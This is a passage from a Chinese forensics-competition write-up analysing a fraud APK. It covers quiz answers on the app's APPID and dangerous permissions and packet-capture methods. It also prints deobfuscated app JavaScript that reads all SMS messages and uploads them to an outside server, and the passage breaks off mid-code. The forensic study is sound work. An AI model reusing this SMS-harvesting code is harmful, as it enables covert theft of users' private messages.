平台管理：用于商店后台的统计、更新、收费管理等。<br>2. API 调用：集成该服务商 SDK（如推送、登录、支付）时，需要用 APPID 来标识自身。<br>3. 应用分发：生成商店下载链接。</td></tr><tr><td style="text-align:left"><strong>示例</strong></td><td style="text-align:left"><code>com.tencent.mm</code> (微信)<br><code>com.netease.cloudmusic</code> (网易云音乐)</td><td style="text-align:left">华为应用市场：<code>C1000000001</code><br>腾讯开放平台：<code>110xxxxxx</code><br>阿里应用分发：<code>12345</code></td></tr></tbody></table></div>在您提供的案例中（包名为 plus.H5B8E45D3，文件夹名为 H5B8E45D3），文件夹名就是APPID的可能性超过了90%。因为这种“包名 = 固定前缀 + APPID”的结构，本身就是服务商为了将技术标识和商业标识强绑定而设计的。因此，在资源目录下使用APPID作为路径的一部分，是保持逻辑一致性的最合理做法。<ul><li>还是不清楚但解题可以APP直接做到</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-3.png" alt="alt text"><br>“当然也可以去网站源文件里面确认，就是看ID”（？没找到APP内的地方）——<a href="https://blog.csdn.net/ntrybw/article/details/126977777">来源</a></p><h4 id="4-该APK具备下列哪些危险权限-多选题-："><a class="header-anchor" href="#4-该APK具备下列哪些危险权限-多选题-：">¶</a>4. 该APK具备下列哪些危险权限(多选题)：</h4><p>A.读取短信  B.读取通讯录 C.读取精确位置 D.修改通讯录 E.修改短信</p><ul><li>APP直接做到</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-4.png" alt="alt text"></p><ul><li>xml文件内查找</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera.autofocus&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.GET_ACCOUNTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_LOGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.huawei.android.launcher.permission.CHANGE_BADGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.asus.msa.SupplementaryDID.ACCESS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><!-- 表格输入位置 --><table><thead><tr><th style="text-align:left">name=后面的字符串</th><th style="text-align:left">对应代表权限意思</th></tr></thead><tbody><tr><td style="text-align:left"><code>android.permission.INTERNET</code></td><td style="text-align:left">访问互联网</td></tr><tr><td style="text-align:left"><code>android.permission.WRITE_EXTERNAL_STORAGE</code></td><td style="text-align:left">写入外部存储</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_NETWORK_STATE</code></td><td style="text-align:left">访问网络状态</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_WIFI_STATE</code></td><td style="text-align:left">访问Wi-Fi状态</td></tr><tr><td style="text-align:left"><code>android.permission.INSTALL_PACKAGES</code></td><td style="text-align:left">安装程序包</td></tr><tr><td style="text-align:left"><code>android.permission.REQUEST_INSTALL_PACKAGES</code></td><td style="text-align:left">请求安装程序包</td></tr><tr><td style="text-align:left"><code>android.hardware.camera</code></td><td style="text-align:left">需要摄像头 (硬件功能)</td></tr><tr><td style="text-align:left"><code>android.hardware.camera.autofocus</code></td><td style="text-align:left">需要自动对焦 (硬件功能)</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_COARSE_LOCATION</code></td><td style="text-align:left">访问粗略位置</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_FINE_LOCATION</code></td><td style="text-align:left">访问精确位置</td></tr><tr><td style="text-align:left"><code>android.permission.READ_CONTACTS</code></td><td style="text-align:left">读取联系人</td></tr><tr><td style="text-align:left"><code>android.permission.READ_SMS</code></td><td style="text-align:left">读取短信</td></tr><tr><td style="text-align:left"><code>android.permission.RECEIVE_SMS</code></td><td style="text-align:left">接收短信</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_COARSE_LOCATION</code></td><td style="text-align:left">访问粗略位置</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_FINE_LOCATION</code></td><td style="text-align:left">访问精确位置</td></tr><tr><td style="text-align:left"><code>android.permission.SEND_SMS</code></td><td style="text-align:left">发送短信</td></tr><tr><td style="text-align:left"><code>android.permission.WRITE_SMS</code></td><td style="text-align:left">写入短信</td></tr><tr><td style="text-align:left"><code>android.permission.GET_ACCOUNTS</code></td><td style="text-align:left">获取账户列表</td></tr><tr><td style="text-align:left"><code>android.permission.WRITE_CONTACTS</code></td><td style="text-align:left">写入联系人</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_WIFI_STATE</code></td><td style="text-align:left">访问Wi-Fi状态</td></tr><tr><td style="text-align:left"><code>android.permission.ACCESS_NETWORK_STATE</code></td><td style="text-align:left">访问网络状态</td></tr><tr><td style="text-align:left"><code>android.permission.CHANGE_WIFI_STATE</code></td><td style="text-align:left">更改Wi-Fi状态</td></tr><tr><td style="text-align:left"><code>android.permission.READ_PHONE_STATE</code></td><td style="text-align:left">读取手机状态</td></tr><tr><td style="text-align:left"><code>android.permission.WRITE_EXTERNAL_STORAGE</code></td><td style="text-align:left">写入外部存储</td></tr><tr><td style="text-align:left"><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></td><td style="text-align:left">挂载和卸载文件系统</td></tr><tr><td style="text-align:left"><code>android.permission.READ_LOGS</code></td><td style="text-align:left">读取系统日志</td></tr><tr><td style="text-align:left"><code>android.permission.WRITE_SETTINGS</code></td><td style="text-align:left">写入系统设置</td></tr><tr><td style="text-align:left"><code>com.huawei.android.launcher.permission.CHANGE_BADGE</code></td><td style="text-align:left">华为角标权限</td></tr><tr><td style="text-align:left"><code>android.permission.READ_EXTERNAL_STORAGE</code></td><td style="text-align:left">读取外部存储</td></tr><tr><td style="text-align:left"><code>com.asus.msa.SupplementaryDID.ACCESS</code></td><td style="text-align:left">华硕补充设备ID权限</td></tr></tbody></table></div><p>反思：联网可以直接丢给ai，断网可以复制黏贴到txt搜索read,write等词<br><a href="https://www.cnblogs.com/linn/p/4046180.html">网上找到的对应关系表，在images文件夹存储文件名为：安卓权限中英文对应表.jpeg</a></p><h4 id="5-该APK发送回后台服务器的数据包含一下哪些内容-多选题-："><a class="header-anchor" href="#5-该APK发送回后台服务器的数据包含一下哪些内容-多选题-：">¶</a>5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</h4><p>A.手机通讯录 B.手机应用列表 C.手机号码 D.验证码 E.GPS定位信息</p><h5 id="法一"><a class="header-anchor" href="#法一">¶</a>法一</h5><ul><li>雷电软件 其他模式抓不到，使用代理模式抓包能抓到CD【复刻失败方法】</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-7.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-8.png" alt="alt text"></p><ul><li>模拟器请求手机通讯录，猜测有A</li><li>添加锁屏密码和通讯录信息后抓包获得</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_7.png" alt="alt text"></p><ul><li><p>答案都出来了，耶</p></li><li><p>官方文档：</p></li><li><p>抓包方式介绍</p></li><li><p>雷电APP智能分析软件目前提供了4种抓包方式，分别是<strong>HTTP、TCP、代理模式、TCPDump</strong>，Android 支持全部4种方式，iOS 目前只支持代理模式抓包，下面分别介绍四种方式的应用场景：</p><ul><li>HTTP 方式是基于手机 VPN 原理实现的抓包，一般情况下如果是要抓HTTP 协议的网络数据包推荐这种方式，不过后台服务器已经不在运行的情况下使用该方式无法抓取到网络数据包。</li><li>TCP 方式同样是基于手机 VPN 原理实现的抓包，如果网络数据包是原生 TCP 协议的话推荐使用这种方式。</li><li>代理模式是基于在手机或者模拟器上设置代理地址实现的抓包（和 fiddler、charles 原理相同），软件会自动设置代理 IP 地址，无需手动填写代理地址，这种方式的优点是后台服务器不在运行的情况下也能抓到请求的网络数据包。</li><li>TCPDump 模式是基于 libpcap 库的抓包，根据使用者的定义对网络上的数据包进行截获，可以将网络中传送的数据包完全截获下来提供分析，这种方式的优点是可以抓取到所有协议的网络数据包。</li></ul></li><li><p>抓包方式选用</p><ul><li>抓 HTTP 协议首选 HTTP 方式抓包，后台服务器不存在的情况下选择代理模式抓包；</li><li>抓 TCP 协议选择 TCP 方式抓包；</li><li>在其他方式都抓包无果的情况下，建议使用 TCPDump 进行尝试；</li></ul></li><li><p>抓包注意事项</p><ul><li>代理模式和 TCPDump 抓包不能自动区分网络数据包是来源哪个应用的，有可能会混入非当前 APP 的网络数据包，因此需要自己筛选判断；</li><li>代理模式如果使用的是真机，真机需要和 PC 保持在同一局域网；</li><li>代理模式和 TCPDump 抓到的网络数据包需要先在分析结果页中将目标数据包添加标记后才能导出到 Word/PDF 报告；</li><li>Android 设备使用代理模式时软件会自动设置代理，结束抓包的时候软件会自动清除代理。如果没有正常结束代理模式抓包，可能会因残留的代理设置导致Android设备无法上网，可以使用雷电APP自动修复；</li><li>iOS 设备使用代理模式时需要自己安装证书、配置代理设置以及清除代理设置；</li><li>TCPDump 抓包模式下不会实时更新抓包结果，只有在点击结束后才会进行解析并展示抓包结果；</li><li>TCPDump 的抓包结果目前只支持 HTTP 请求的解析，HTTPS 请求需要借 Wireshark 进行分析。</li></ul></li></ul><h5 id="法二"><a class="header-anchor" href="#法二">¶</a>法二</h5><ul><li>jadx搜索</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-6-1.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_2-10.png" alt="alt text"></p><ul><li><a href="https://ctf.bugku.com/tool/sojson4">解密网站</a>得到：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*Aman - 194nb.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.00s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mui.init();</span><br><span class="line"></span><br><span class="line">mui.plusReady(function () &#123;</span><br><span class="line"><span class="comment">//var main = plus.android.runtimeMainActivity();  </span></span><br><span class="line"><span class="comment">// main.moveTaskToBack(false);</span></span><br><span class="line"></span><br><span class="line">var address = plus.device.vendor + <span class="string">&#x27;-&#x27;</span> + plus.device.model;</span><br><span class="line">address = address.replace(/\n/g, <span class="string">&quot;&quot;</span>).replace(/ /g, <span class="string">&quot;&quot;</span>).replace(/\r/g, <span class="string">&quot;&quot;</span>);</span><br><span class="line">var apiserver = <span class="string">&#x27;http://www.honglian7001.com/api/uploads/&#x27;</span>;</span><br><span class="line"><span class="comment">//重复数据处理 预防用户重复点击</span></span><br><span class="line">var danjishijian = <span class="literal">true</span>;</span><br><span class="line">function requestPermission(sjh, yqm) &#123;</span><br><span class="line">plus.android.requestPermissions(</span><br><span class="line">[<span class="string">&quot;android.permission.READ_SMS&quot;</span>],</span><br><span class="line">function (resultObj) &#123;</span><br><span class="line"><span class="comment">//SmsInfo存放一条短信的各项内容</span></span><br><span class="line">var SmsInfo = &#123;&#125;</span><br><span class="line"><span class="comment">//Sms存放所有短信</span></span><br><span class="line">var Sms = &#123;&#125;</span><br><span class="line"></span><br><span class="line">var aimei = sjh;</span><br><span class="line">var aimei2 = yqm;</span><br><span class="line">var duanxin = <span class="string">&#x27;[&#123;&quot;imei&quot;:&quot;&#x27;</span> + aimei + <span class="string">&#x27;&quot;,&quot;imei2&quot;:&quot;&#x27;</span> + aimei2 + <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">var Cursor = plus.android.importClass(<span class="string">&quot;android.database.Cursor&quot;</span>)</span><br><span class="line">var Uri = plus.android.importClass(<span class="string">&quot;android.net.Uri&quot;</span>)   <span class="comment">//注意啦，android.net.Uri中的net是小写</span></span><br><span class="line">var activity = plus.android.runtimeMainActivity()</span><br><span class="line">var uri = Uri.parse(<span class="string">&quot;content://sms/&quot;</span>);</span><br><span class="line"></span><br><span class="line">var projection = new Array(<span class="string">&quot;_id&quot;</span>, <span class="string">&quot;address&quot;</span>, <span class="string">&quot;person&quot;</span>, <span class="string">&quot;body&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;type&quot;</span>)</span><br><span class="line">var cusor = activity.managedQuery(uri, projection, null, null, <span class="string">&quot;date desc&quot;</span>)</span><br><span class="line">var idColumn = cusor.getColumnIndex(<span class="string">&quot;_id&quot;</span>)</span><br><span class="line">var nameColumn = cusor.getColumnIndex(<span class="string">&quot;person&quot;</span>)</span><br><span class="line">var phoneNumberColumn = cusor.getColumnIndex(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">var smsbodyColumn = cusor.getColumnIndex(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">var dateColumn = cusor.getColumnIndex(<span class="string">&quot;date&quot;</span>)</span><br><span class="line">var typeColumn = cusor.getColumnIndex(<span class="string">&quot;type&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> (cusor != null) &#123;</span><br><span class="line"><span class="keyword">while</span> (cusor.moveToNext()) &#123;</span><br><span class="line">SmsInfo.id = cusor.getString(idColumn)</span><br><span class="line">SmsInfo.Name = cusor.getInt(nameColumn)</span><br><span class="line">SmsInfo.Date = cusor.getLong(dateColumn)</span><br><span class="line">SmsInfo.Date = getFormatDate(SmsInfo.Date)</span><br><span class="line">SmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)</span><br><span class="line">SmsInfo.Smsbody = cusor.getString(smsbodyColumn)</span><br><span class="line">SmsInfo.Type = cusor.getString(typeColumn)</span><br><span class="line"></span><br><span class="line">var post = JSON.stringify(SmsInfo);</span><br><span class="line"><span class="comment">//console.log(post);</span></span><br><span class="line">duanxin = duanxin + <span class="string">&#x27;,&#x27;</span> + post;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">duanxin = duanxin + <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line"><span class="comment">//alert(duanxin);</span></span><br><span class="line"></span><br><span class="line">mui.ajax(apiserver + <span class="string">&#x27;apisms&#x27;</span>, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: duanxin</span><br><span class="line">&#125;,</span><br><span class="line">dataType: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">type: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">timeout: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">success: function (data) &#123;</span><br><span class="line">mui.toast(<span class="string">&#x27;获取成功&#x27;</span>)</span><br><span class="line"><span class="comment">//console.log(con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line"><span class="comment">//异常处理；</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">cusor.close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">function (error) &#123;</span><br><span class="line">console.<span class="built_in">log</span>(<span class="string">&#x27;申请权限错误：&#x27;</span> + error.code + <span class="string">&quot; = &quot;</span> + error.message);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展Date功能：将long型日期转换为特定的格式</span></span><br><span class="line">Date.prototype.format = function (format) &#123;</span><br><span class="line">var o = &#123;</span><br><span class="line"><span class="string">&quot;M+&quot;</span>: this.getMonth() + <span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;d+&quot;</span>: this.getDate(),</span><br><span class="line"><span class="string">&quot;h+&quot;</span>: this.getHours(),</span><br><span class="line"><span class="string">&quot;m+&quot;</span>: this.getMinutes(),</span><br><span class="line"><span class="string">&quot;s+&quot;</span>: this.getSeconds(),</span><br><span class="line"><span class="string">&quot;q+&quot;</span>: Math.<span class="built_in">floor</span>((this.getMonth() + <span class="number">3</span>) / <span class="number">3</span>),</span><br><span class="line"><span class="string">&quot;S&quot;</span>: this.getMilliseconds()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (/(y+)/.test(format)) &#123;</span><br><span class="line">format = format.replace(RegExp.$<span class="number">1</span>, (this.getFullYear() + <span class="string">&quot;&quot;</span>).substr(<span class="number">4</span> - RegExp.$<span class="number">1.l</span>ength));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (var k in o) &#123;</span><br><span class="line"><span class="keyword">if</span> (new RegExp(<span class="string">&quot;(&quot;</span> + k + <span class="string">&quot;)&quot;</span>).test(format)) &#123;</span><br><span class="line">format = format.replace(RegExp.$<span class="number">1</span>, RegExp.$<span class="number">1.l</span>ength == <span class="number">1</span> ? o[k] : (<span class="string">&quot;00&quot;</span> + o[k]).substr((<span class="string">&quot;&quot;</span> + o[k]).length));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> format;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将long型日期转换为特定格式</span></span><br><span class="line">function getFormatDate(l, pattern) &#123;</span><br><span class="line">date = new Date(l);</span><br><span class="line"><span class="keyword">if</span> (pattern == undefined) &#123;</span><br><span class="line">pattern = <span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> date.format(pattern);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert(plus.device.uuid)</span></span><br><span class="line">plus.navigator.setStatusBarBackground(<span class="string">&quot;#db6eff&quot;</span>);</span><br><span class="line"></span><br><span class="line">mui(<span class="string">&quot;body&quot;</span>).off(<span class="string">&quot;tap&quot;</span>);</span><br><span class="line"></span><br><span class="line">mui(<span class="string">&quot;body&quot;</span>).on(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#tx&#x27;</span>, function (event) &#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;#tx&#x27;</span>).hide();</span><br><span class="line">$(<span class="string">&#x27;#zz&#x27;</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mui(<span class="string">&quot;body&quot;</span>).on(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#gb&#x27;</span>, function (event) &#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;#tx&#x27;</span>).show();</span><br><span class="line">$(<span class="string">&#x27;#zz&#x27;</span>).hide();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mui(<span class="string">&quot;body&quot;</span>).on(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#qd&#x27;</span>, function (event) &#123;</span><br><span class="line"><span class="keyword">if</span> (danjishijian) &#123;</span><br><span class="line">danjishijian = <span class="literal">false</span>;</span><br><span class="line">aa()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">aa()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function getPermission(permissionIdentity, successCallBack, errorCallBack) &#123;</span><br><span class="line"><span class="comment">//权限标识转换成大写  </span></span><br><span class="line">var permissionIdentity = permissionIdentity.toUpperCase();</span><br><span class="line"><span class="comment">//获取检测权限的状态  </span></span><br><span class="line">var checkResult = plus.navigator.checkPermission(permissionIdentity);</span><br><span class="line"><span class="comment">//权限状态是否正常  </span></span><br><span class="line">var permissionStatusOk = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//权限中文名称  </span></span><br><span class="line">var permissionName = <span class="string">&#x27;&#x27;;</span></span><br><span class="line"><span class="string">//对应 andorid 的具体权限  </span></span><br><span class="line"><span class="string">var androidPermission = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">//获取权限中文意思与对应 android 系统的权限字符串  </span></span><br><span class="line"><span class="string">switch (permissionIdentity) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">case &#x27;</span>CONTACTS<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">permissionName = &#x27;</span>系统联系人<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">androidPermission = &#x27;</span>android.permission.READ_CONTACTS&#x27;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">permissionName = <span class="string">&#x27;未知&#x27;</span>;</span><br><span class="line">androidPermission = <span class="string">&#x27;未知&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断检查权限的结果  </span></span><br><span class="line"><span class="keyword">switch</span> (checkResult) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;authorized&#x27;</span>:</span><br><span class="line"><span class="comment">//正常的  </span></span><br><span class="line">permissionStatusOk = <span class="literal">true</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;denied&#x27;</span>:</span><br><span class="line"><span class="comment">//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  </span></span><br><span class="line"><span class="comment">//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  </span></span><br><span class="line"><span class="comment">// console.log(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;)  </span></span><br><span class="line"><span class="comment">// errorCallBack(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;);  </span></span><br><span class="line"><span class="comment">// return  </span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;undetermined&#x27;</span>:</span><br><span class="line"><span class="comment">// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  </span></span><br><span class="line"><span class="comment">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span></span><br><span class="line"><span class="comment">// errorCallBack(&#x27;未确定&#x27; + permissionName + &#x27;权限&#x27;);  </span></span><br><span class="line"><span class="comment">// return  </span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;unknown&#x27;</span>:</span><br><span class="line">errorCallBack(<span class="string">&#x27;无法查询&#x27;</span> + permissionName + <span class="string">&#x27;权限&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">errorCallBack(<span class="string">&#x27;不支持&#x27;</span> + permissionName + <span class="string">&#x27;权限&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果权限是正常的执行成功回调  </span></span><br><span class="line"><span class="keyword">if</span> (permissionStatusOk) &#123;</span><br><span class="line">successCallBack()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//如果不正常，如果是 andorid 系统，就动态申请权限  </span></span><br><span class="line"><span class="keyword">if</span> (plus.os.name == <span class="string">&#x27;Android&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//动态申请权限  </span></span><br><span class="line">plus.android.requestPermissions([androidPermission], function (e) &#123;</span><br><span class="line"><span class="keyword">if</span> (e.deniedAlways.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//权限被永久拒绝  </span></span><br><span class="line"><span class="comment">// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  </span></span><br><span class="line">errorCallBack(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span 